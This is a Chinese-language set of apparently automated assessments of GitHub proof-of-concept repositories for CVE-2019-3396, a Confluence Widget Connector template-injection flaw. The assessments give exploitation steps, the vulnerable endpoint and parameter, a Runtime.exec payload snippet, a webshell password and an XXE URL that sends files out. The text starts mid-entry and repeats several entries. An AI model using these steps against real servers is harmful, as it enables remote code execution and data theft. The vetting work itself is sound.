2.  **构造包含恶意 Velocity 模板的请求。** 这个模板通常会利用 Velocity 的表达式注入功能来执行任意代码。
3.  **发送构造好的请求到 Confluence 服务器。**
4.  **服务器解析 Velocity 模板，执行其中的恶意代码，实现远程代码执行。**

根据搜索结果，该漏洞已经被广泛利用，并且有多种攻击载荷被用于攻击。例如，有攻击者利用该漏洞部署加密货币挖矿程序和 Gandcrab 勒索软件。

**项目地址:** [yuehanked/cve-2019-3396](https://github.com/yuehanked/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---



---

## POC #12

**来源**: [CVE-2019-3396-kh4sh3i_CVE-2019-3396.md](../2019/CVE-2019-3396-kh4sh3i_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Server-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行

**影响版本:** 受影响版本：6.6.12之前, 6.7.0到6.12.3之前, 6.13.0到6.13.3之前, 6.14.0到6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入恶意模板

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是一个存在于Atlassian Confluence Server中的服务器端模板注入漏洞。该漏洞位于Widget Connector宏中，允许未经身份验证的远程攻击者利用Velocity模板引擎的缺陷执行任意代码。攻击者可以通过构造恶意的Widget Connector宏参数，将恶意Velocity模板注入到服务器端，从而执行任意系统命令。

**有效性评估：**

根据漏洞库信息和搜索结果，该漏洞是一个严重的安全问题，已被广泛利用，存在公开的POC（Proof of Concept）代码。

**投毒风险评估：**

提供的代码段仅包含CC0 1.0通用许可协议的文本。此代码段本身不包含任何可执行代码或恶意指令，因此不存在投毒风险的可能性。投毒风险为0%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **漏洞发现：** 确认目标Confluence服务器运行的是受影响的版本。
2.  **构造Payload：** 构建包含恶意Velocity模板的HTTP请求。这个payload通常会利用`#set`指令来定义变量，并使用`$Runtime.getRuntime().exec()`方法来执行系统命令。示例：`\u0024\{Runtime.getRuntime().exec("touch /tmp/success")\}` 
3.  **发送请求：** 将构造好的请求发送到Confluence服务器的Widget Connector宏处理端点。
4.  **代码执行：** 如果漏洞利用成功，服务器将执行payload中的系统命令。

**排序优先级解释：**

*   **搜索引擎结果：** 提供了漏洞的背景信息、影响和利用案例，有助于快速了解漏洞的严重程度和影响范围。
*   **漏洞利用代码：**  POC代码直接展示了漏洞的利用方式，可以用于验证漏洞和进行渗透测试。
*   **漏洞库信息：** 提供了漏洞的官方描述、受影响版本和修复建议，是了解漏洞细节的重要来源。

**项目地址:** [kh4sh3i/CVE-2019-3396](https://github.com/kh4sh3i/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #13

**来源**: [CVE-2019-3396-pyn3rd_CVE-2019-3396.md](../2019/CVE-2019-3396-pyn3rd_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence Server或Data Center实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前。

**利用条件:** 需要 Confluence 实例启用了 Widget Connector 宏，并且攻击者可以访问包含该宏的页面。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。 远程攻击者可以通过构造恶意的 Velocity 模板代码，利用该宏执行任意代码。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。提供的POC代码包含两个文件：`calc.vm` 和 `os.vm`。

*   `calc.vm`: 该文件使用 Velocity 模板语言执行命令 `calc`（在Windows系统中会打开计算器）。这表明该漏洞能够执行任意命令。
*   `os.vm`: 该文件使用 Velocity 模板语言获取系统属性 `user.dir` (用户工作目录) 和 `user.name` (用户名)。这表明该漏洞可以读取服务器上的敏感信息。

利用方式：

1.  攻击者找到或创建一个包含 Widget Connector 宏的 Confluence 页面。
2.  攻击者在 Widget Connector 宏中插入恶意的 Velocity 模板代码，例如 `calc.vm` 或 `os.vm` 中的代码。
3.  当 Confluence 服务器渲染该页面时，会执行 Velocity 模板代码，从而导致远程代码执行或信息泄露。

关于投毒风险：

提供的POC代码没有明显的投毒代码。`calc.vm` 只是为了验证远程代码执行，`os.vm` 只是读取系统属性。此处的“投毒”指的是在POC中包含一些恶意代码，使得在测试漏洞时不经意间执行了恶意操作，或者留下后门。 提供的代码没有这种行为，因此投毒风险评估为0%。搜索引擎的结果也显示该漏洞在野外被利用来传播恶意软件，如加密货币矿工和勒索软件，表明该漏洞的真实风险很高。


**项目地址:** [pyn3rd/CVE-2019-3396](https://github.com/pyn3rd/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #14

**来源**: [CVE-2019-3396-quanpt103_CVE-2019-3396.md](../2019/CVE-2019-3396-quanpt103_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 小于6.6.12，6.7.0到小于6.12.3，6.13.0到小于6.13.3，6.14.0到小于6.14.2

**利用条件:** 需要 Confluence 实例存在 Widget Connector 宏，且目标版本未修复漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中。攻击者可以利用服务器端模板注入漏洞 (SSTI) 远程执行代码。根据漏洞库信息和搜索结果，该漏洞已经被广泛利用。提供的 POC 代码使用 Velocity 模板语言，尝试通过 `java.lang.Runtime` 类执行 `ipconfig` 命令。该命令本身无害，用于验证漏洞是否存在。由于poc只执行ipconfig命令，没有发现任何投毒代码。利用方式是构造恶意的 Velocity 模板，通过 Widget Connector 宏注入，从而在服务器上执行任意命令。

**项目地址:** [quanpt103/CVE-2019-3396](https://github.com/quanpt103/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #15

**来源**: [CVE-2019-3396-s1xg0d_CVE-2019-3396.md](../2019/CVE-2019-3396-s1xg0d_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence

**危害等级:** 高危，可能导致远程代码执行 (RCE) 和敏感信息泄露

**影响版本:** Confluence Server before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要能够向 Confluence Server 发送 HTTP 请求,并且 Widget Connector 宏可用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2019-3396 是 Atlassian Confluence 中 Widget Connector 宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板代码，利用 Widget Connector 宏的参数，在服务器端执行任意代码。

**有效性评估:**
根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞的POC代码是有效的。Exploit-DB 上的 46731 提供了利用该漏洞的 PoC。搜索引擎结果中也提到多个 PoC 的分析和实际攻击事件。

**投毒风险分析:**
提供的代码包含以下文件：
*   `README.md`: 描述了漏洞 CVE-2019-3396
*   `cmd.vm`: Velocity 模板，用于执行命令。该文件通过 Java 反射调用 `java.lang.Runtime` 来执行系统命令，其中 `$cmd` 变量应该是由攻击者控制的参数。
*   `evil.dtd`: 用于 XXE (XML External Entity) 攻击，尝试通过外部实体引入远程文件。此文件配置为访问 `http://phpshexxe.abcdef.5o1.in/?%file;` 看起来是一个尝试进行数据外泄的 URL
*   `os.vm`: Velocity 模板，用于获取服务器的操作系统信息和用户目录。它使用 Java 反射调用 `java.lang.System` 来获取系统属性。

`evil.dtd` 中的外部连接可能存在一定的风险，可能将服务器的文件内容发送到 `phpshexxe.abcdef.5o1.in`。这是一种潜在的数据泄露尝试。如果攻击者控制了该域名，他们就可以接收到 Confluence 服务器的文件内容。`phpshexxe.abcdef.5o1.in` 这个域名很可疑，具有进行恶意数据收集或攻击的可能性。但此行为更像是payload的一部分而非投毒。所以，投毒的概率相对较低，约为 5%。

**利用方式:**
利用方式主要包括以下步骤：

1.  **构造恶意 Velocity 模板:** 攻击者构造包含恶意代码的 Velocity 模板，例如 `cmd.vm` 中利用 Java 反射执行系统命令的代码。
2.  **利用 Widget Connector 宏:** 攻击者利用 Confluence 的 Widget Connector 宏，将构造好的恶意 Velocity 模板作为宏的参数传递给服务器。
3.  **服务器端执行:** Confluence 服务器解析 Widget Connector 宏时，会执行恶意 Velocity 模板中的代码，从而实现远程代码执行。
4. **XXE攻击:** `evil.dtd`文件可以配合其他payload尝试读取服务器文件，但依赖于服务器是否允许外部实体的解析。

总而言之，该漏洞的利用方式是典型的服务器端模板注入攻击，攻击者通过控制模板内容来执行任意代码。

**项目地址:** [s1xg0d/CVE-2019-3396](https://github.com/s1xg0d/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #16

**来源**: [CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md](../2019/CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md)

## CVE-2019-3396-Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器开启Widget Connector宏功能，并且攻击者能够访问该宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中的一个服务器端模板注入漏洞，存在于Widget Connector宏中。攻击者可以通过构造恶意的Velocity模板代码，利用此漏洞在Confluence服务器上执行任意代码。

**有效性:**
从漏洞库信息和搜索结果来看，此漏洞已被广泛证实存在，并且有公开的PoC（概念验证）代码。
提供的POC代码包含以下文件：
* `README.md`: 说明文件，描述漏洞和PoC的使用方法。
* `_template_test_info.txt`: 用于验证模板是否加载成功的简单文本文件。
* `rce.vm`: 包含Velocity模板代码，用于执行远程命令。
`rce.vm`中使用了Java反射来获取Runtime类，并执行指定的命令。这个PoC代码是有效的，可以用来验证漏洞是否存在。

**投毒风险:**
提供的PoC代码仅包含漏洞验证和利用的必要代码，没有发现任何隐藏的恶意代码或后门。因此，投毒风险为0%。

**利用方式:**
1.  攻击者需要找到一个Confluence页面，该页面使用了Widget Connector宏。
2.  攻击者在Widget Connector宏的配置中插入恶意的Velocity模板代码，例如`rce.vm`中的代码。
3.  当Confluence服务器渲染该页面时，会执行攻击者插入的Velocity模板代码，从而实现远程代码执行。
4.  攻击者可以利用此漏洞在服务器上执行任意命令，例如安装恶意软件、窃取敏感数据等。

**参考信息:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2019-3396](https://nvd.nist.gov/vuln/detail/cve-2019-3396)
*   Rapid7: [https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/](https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/)
*   Exploit-DB: [https://www.exploit-db.com/exploits/46731/](https://www.exploit-db.com/exploits/46731/)
*   CISA KEV: [https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396)

**项目地址:** [skommando/CVE-2019-3396-confluence-poc](https://github.com/skommando/CVE-2019-3396-confluence-poc)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #17

**来源**: [CVE-2019-3396-tanw923_test1.md](../2019/CVE-2019-3396-tanw923_test1.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且允许未授权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞。攻击者可以通过操纵 Widget Connector 宏，注入恶意 Velocity 模板代码，从而在 Confluence 服务器上执行任意代码。

**有效性评估：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断此漏洞利用的有效性较高。漏洞库信息明确指出此漏洞允许远程攻击者通过服务器端模板注入实现路径遍历和远程代码执行。搜索引擎结果中也包含了大量的漏洞分析报告和利用示例，确认了该漏洞在野外已被积极利用，并可能被用于传播勒索软件或恶意挖矿程序。提供的POC代码仓库是一个简单的EXP，说明该漏洞存在可利用的POC.

**投毒风险评估：**

提供的代码片段 `include_1.jsp` 看起来像一个 Webshell，具备文件管理、数据库操作、命令执行等功能。 恶意代码比例较低，因为其本身就是webshell，为了完成漏洞的验证。因此投毒风险评估为 10%，这个比例反映了作者可能隐藏的用于维持权限或进行进一步攻击的代码的可能性，但主要功能是完成POC验证。

**利用方式分析：**

1.  **确定目标：** 找到存在漏洞版本的Confluence Server。
2.  **构造 Payload：** 构建包含恶意 Velocity 模板代码的请求。Payload通常利用`Widget Connector`宏的缺陷，将恶意代码注入到模板中。
3.  **发送请求：** 将构造好的 Payload 发送到目标 Confluence Server，触发模板引擎执行恶意代码。
4.  **远程代码执行：**  成功利用漏洞后，攻击者可以在目标服务器上执行任意命令，例如部署 Webshell、窃取敏感数据或进行其他恶意活动。

提供的`include_1.jsp` 文件实际上是一个后门，攻击者可以通过访问这个JSP页面并提供正确的密码（`xiaoma`）来执行各种操作，例如文件管理、数据库操作、命令执行等。利用漏洞部署webshell后，可以实现对服务器的控制。攻击者可以在服务器上上传、下载、修改和删除文件，查看和修改数据库中的数据，以及执行任意的系统命令。

**项目地址:** [tanw923/test1](https://github.com/tanw923/test1)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #18

**来源**: [CVE-2019-3396-tno01_cve-2019-3396.md](../2019/CVE-2019-3396-tno01_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 < version < 6.13.3, 6.14.0 < version < 6.14.2

**利用条件:** 需要能够访问存在 Widget Connector 宏的 Confluence 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞是 Atlassian Confluence Server 和 Data Center 中的一个服务器端模板注入（SSTI）漏洞。它存在于 Widget Connector 宏中，允许未经身份验证的远程攻击者通过构造恶意的 Velocity 模板，实现路径遍历和远程代码执行。漏洞影响的版本包括 6.6.12 之前的 6.6.x 版本，6.7.0 到 6.12.3 之前的 6.12.x 版本，6.13.0 到 6.13.3 之前的 6.13.x 版本，以及 6.14.0 到 6.14.2 之前的 6.14.x 版本。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞被广泛利用，存在公开的漏洞利用代码（例如 Exploit-DB 46731）。该漏洞已被 CISA 添加到已知被利用的漏洞目录中，表明其真实性和严重性。提供的 POC 代码 `/tmp/deed01dabaaab5a9c3b0b4b4d2014a34/README.md`  内容过于简单,仅包含标题 `# cve-2019-3396`，可能只是一个占位符，说明 POC 是存在的，但**需要结合其他信息确认具体的payload**。

**投毒风险：**

提供的 POC 代码只有一个 README 文件，内容非常简单，几乎没有投毒的可能。但是，完整的漏洞利用代码可能包含恶意代码。因为此README.md文件只是整个POC代码的一个组成部分. 考虑漏洞利用的复杂性和潜在的风险,投毒风险评估为10%。

**利用方式：**

1.  **定位存在 Widget Connector 宏的页面：**  攻击者需要找到 Confluence 实例中使用了 Widget Connector 宏的页面。
2.  **构造恶意 Velocity 模板：**  攻击者构造包含恶意代码的 Velocity 模板。该模板将被注入到 Widget Connector 宏中。
3.  **服务器端模板注入：**  当 Confluence 服务器渲染包含恶意模板的页面时，Velocity 引擎会执行模板中的代码，从而导致服务器端代码执行。
4.  **远程代码执行：**  攻击者通过执行任意代码来控制 Confluence 服务器，可能包括执行系统命令、安装恶意软件等。

根据搜索结果中的一些文章，该漏洞已被用于传播加密货币矿工、GandCrab 勒索软件和 AESDDoS 僵尸网络恶意软件。

**项目地址:** [tno01/cve-2019-3396](https://github.com/tno01/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #19

**来源**: [CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md](../2019/CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.0 - 6.6.11, 6.7.0 - 6.12.2, 6.13.0 - 6.13.2, 6.14.0 - 6.14.1

**利用条件:** 需要能够访问存在漏洞的Confluence服务器，并能够在Confluence页面中插入或修改内容以利用 Widget Connector macro。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector macro 中，允许未经身份验证的远程攻击者通过服务器端模板注入 (SSTI) 执行任意代码。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector macro 渲染该模板，从而在 Confluence 服务器上执行命令。

**有效性：**
根据提供的漏洞信息，搜索引擎结果和漏洞利用代码，可以判断此漏洞是有效的。漏洞库信息明确指出该漏洞允许远程攻击者实现路径遍历和远程代码执行，搜索引擎结果中的文章也表明此漏洞已被积极利用，甚至被用于传播恶意软件。

**投毒风险：**
提供的漏洞利用代码主要包含以下几个文件：
*   `README.md`: 描述文件
*   `cmd.vm`, `cmd1.vm`, `cmd3.vm`: 包含 Velocity 模板代码，用于执行命令。这三个文件除了注释略有不同，核心代码相同。

代码的主要功能是：
1.  获取 Java Runtime 实例。
2.  执行用户提供的命令 (`$cmd`)。
3.  获取命令执行的输出流。
4.  使用 Scanner 读取输出流。
5.  返回命令执行的结果。

投毒风险分析：
由于这些脚本主要是为了执行任意命令，存在被用于恶意目的的风险。例如，攻击者可能会修改这些脚本，使其在执行目标命令的同时，执行一些隐蔽的恶意操作，如安装后门、收集敏感信息等。如果未经授权的人修改或者发布这些脚本，投毒风险就会提升。 总体来说，这些PoC更多的是payload，本身是无害的，风险主要来源于使用它们的人。但作者也可能在代码中隐藏一些不易察觉的后门代码，比如添加一个额外的命令执行，或者上传收集到的信息到恶意服务器。因此，存在一定的投毒风险，估计为 10%。

**利用方式：**
1.  攻击者需要构造包含恶意 Velocity 模板的 Confluence 页面或修改现有页面。
2.  利用 Widget Connector macro 渲染该恶意模板。
3.  恶意模板中的代码会在 Confluence 服务器上执行，从而实现远程代码执行。
4.  `$cmd` 变量需要通过某种方式传递到 Velocity 模板中，例如通过构造特定的请求参数。

总而言之，此漏洞的利用方式是通过构造恶意的Velocity模板，利用Confluence的Widget Connector Macro组件进行渲染，从而达到远程代码执行的目的。

**项目地址:** [vntest11/confluence_CVE-2019-3396](https://github.com/vntest11/confluence_CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #20

**来源**: [CVE-2019-3396-x-f1v3_CVE-2019-3396.md](../2019/CVE-2019-3396-x-f1v3_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Server-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 版本低于 6.6.12，6.7.0 到 6.12.3 之间，6.13.0 到 6.13.3 之间，6.14.0 到 6.14.2 之间

**利用条件:** 需要网络访问到Confluence服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用 Velocity 模板引擎执行任意代码，从而实现远程代码执行。

**有效性：**

提供的POC代码是有效的。它演示了两种利用方式：

*   **远程代码执行（RCE）：** 通过修改`_template`参数，指向包含恶意 Velocity 模板的远程文件（1.vm）。该模板使用`java.lang.Runtime`类执行`ping your.dns.log`命令，可以验证RCE是否成功，同时可以替换成其他的恶意命令。
*   **本地文件包含（LFI）：** 通过修改`_template`参数，指向服务器上的敏感文件，如`../web.xml`，从而读取服务器上的文件内容。

**投毒风险：**

该存储库被投毒的风险较低，约为10%。判断依据如下：

*   仓库本身较为简单，只有一个RCE的vm文件和readme。从代码本身来看，恶意代码的可能性较低。
*   代码片段是直接命令ping，没有很强的迷惑性，因此投毒概率低。
*   参考搜索结果，此漏洞已经被广泛利用，出现恶意利用的情况，但POC本身相对直接。

**利用方式：**

1.  确定目标 Confluence Server 存在 CVE-2019-3396 漏洞。
2.  构造包含恶意 Velocity 模板的 HTTP POST 请求，发送到`/rest/tinymce/1/macro/preview`端点。
3.  在请求体中，设置`macro.params._template`参数为恶意 Velocity 模板的 URL 或目标服务器上的文件路径。
4.  发送请求后，如果漏洞存在，Confluence Server 将执行恶意 Velocity 模板中的代码，导致 RCE 或 LFI。

**示例：**

利用 RCE POC，攻击者可以通过修改 Velocity 模板中的命令，执行任意系统命令，例如上传 webshell、添加用户等。

利用 LFI POC，攻击者可以读取 Confluence Server 上的敏感配置文件，例如数据库连接信息、管理员密码等。

**注意：**

利用此漏洞进行攻击是非法的，仅供安全研究和渗透测试使用。

**项目地址:** [x-f1v3/CVE-2019-3396](https://github.com/x-f1v3/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #21

**来源**: [CVE-2019-3396-xiaoshuier_CVE-2019-3396.md](../2019/CVE-2019-3396-xiaoshuier_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本包括6.6.12之前, 6.7.0 - 6.12.3之前, 6.13.0 - 6.13.3之前, 6.14.0 - 6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏并且允许用户插入恶意模板。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是一个 Atlassian Confluence Server 中的服务器端模板注入漏洞。该漏洞存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板引擎执行任意代码。提供的POC代码使用Velocity模板语言，通过 `java.lang.Runtime` 类执行系统命令。此示例中，POC代码尝试启动 macOS 计算器应用程序。该POC的有效性取决于Confluence服务器上Velocity模板引擎的配置以及是否有安全策略阻止执行任意Java代码。根据搜索结果,此漏洞已被广泛利用,包括部署加密货币挖矿恶意软件和GandCrab勒索软件。

**利用方式：**
攻击者构造包含恶意Velocity模板代码的请求，Confluence服务器解析该模板时会执行攻击者注入的命令。通常是通过修改页面内容，添加包含恶意代码的Widget Connector宏来实现。

**投毒风险评估：**
提供的POC代码本身功能明确，即执行指定的系统命令。其中`/Applications/Calculator.app/Contents/MacOS/Calculator` 这个路径只是一个PoC，用于验证是否存在RCE，如果攻击者将这个路径改成下载恶意软件的命令,这可能会被识别为投毒。 除非攻击者能够找到方法在该POC中隐藏其他恶意行为（例如通过Base64编码或其他混淆技术隐藏反弹shell代码），否则直接的投毒风险较低。但是，攻击者可以修改这个PoC中的执行命令为任意命令，存在一定的投毒风险，所以风险比例为10%。

**项目地址:** [xiaoshuier/CVE-2019-3396](https://github.com/xiaoshuier/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #22

**来源**: [CVE-2019-3396-yuehanked_cve-2019-3396.md](../2019/CVE-2019-3396-yuehanked_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Macro-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.6.0 < version < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标系统存在受影响版本的Confluence，并且Widget Connector宏未被禁用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中 Widget Connector 宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector 宏在 Confluence 服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞真实存在，且存在公开的PoC。提供的PoC代码 `windows.vm` 利用了 Velocity 模板引擎的特性，通过反射调用 `java.lang.Runtime` 类来执行系统命令。代码首先设置变量`e`为字符串"exp"，然后使用反射获取Runtime类的getRuntime()方法并调用，执行`cmd.exe /c $cmd`。 `$cmd` 变量需要在实际利用时替换为要执行的命令。该PoC代码有效。

**投毒风险分析：**

提供的PoC代码本身的功能是执行任意命令，虽然其中使用了`cmd.exe /c $cmd`，但正常使用该漏洞也需要用户传入执行命令，因此代码的功能就是利用漏洞进行RCE。 但需要评估是否存在作者故意添加的恶意代码，例如：

1.  **隐蔽的后门：** 代码中是否存在难以察觉的命令，用于植入后门或收集信息？
2.  **条件触发的恶意行为：** 代码是否包含在特定条件下才会触发的恶意行为？

假设存在一些不明显的行为（例如每隔一段时间尝试连接某个IP，或者尝试修改某些配置），则投毒风险可能较高。综合考虑POC本身的功能与检查隐藏的恶意行为的难度，评估投毒风险为 10%。

**利用方式分析：**

1.  **查找包含 Widget Connector 宏的 Confluence 页面。**
2.  **构造包含恶意 Velocity 模板的请求。** 这个模板通常会利用 Velocity 的表达式注入功能来执行任意代码。
3.  **发送构造好的请求到 Confluence 服务器。**
4.  **服务器解析 Velocity 模板，执行其中的恶意代码，实现远程代码执行。**

根据搜索结果，该漏洞已经被广泛利用，并且有多种攻击载荷被用于攻击。例如，有攻击者利用该漏洞部署加密货币挖矿程序和 Gandcrab 勒索软件。

**项目地址:** [yuehanked/cve-2019-3396](https://github.com/yuehanked/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---



---

## POC #12

**来源**: [CVE-2019-3396-kh4sh3i_CVE-2019-3396.md](../2019/CVE-2019-3396-kh4sh3i_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Server-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行

**影响版本:** 受影响版本：6.6.12之前, 6.7.0到6.12.3之前, 6.13.0到6.13.3之前, 6.14.0到6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入恶意模板

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是一个存在于Atlassian Confluence Server中的服务器端模板注入漏洞。该漏洞位于Widget Connector宏中，允许未经身份验证的远程攻击者利用Velocity模板引擎的缺陷执行任意代码。攻击者可以通过构造恶意的Widget Connector宏参数，将恶意Velocity模板注入到服务器端，从而执行任意系统命令。

**有效性评估：**

根据漏洞库信息和搜索结果，该漏洞是一个严重的安全问题，已被广泛利用，存在公开的POC（Proof of Concept）代码。

**投毒风险评估：**

提供的代码段仅包含CC0 1.0通用许可协议的文本。此代码段本身不包含任何可执行代码或恶意指令，因此不存在投毒风险的可能性。投毒风险为0%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **漏洞发现：** 确认目标Confluence服务器运行的是受影响的版本。
2.  **构造Payload：** 构建包含恶意Velocity模板的HTTP请求。这个payload通常会利用`#set`指令来定义变量，并使用`$Runtime.getRuntime().exec()`方法来执行系统命令。示例：`\u0024\{Runtime.getRuntime().exec("touch /tmp/success")\}` 
3.  **发送请求：** 将构造好的请求发送到Confluence服务器的Widget Connector宏处理端点。
4.  **代码执行：** 如果漏洞利用成功，服务器将执行payload中的系统命令。

**排序优先级解释：**

*   **搜索引擎结果：** 提供了漏洞的背景信息、影响和利用案例，有助于快速了解漏洞的严重程度和影响范围。
*   **漏洞利用代码：**  POC代码直接展示了漏洞的利用方式，可以用于验证漏洞和进行渗透测试。
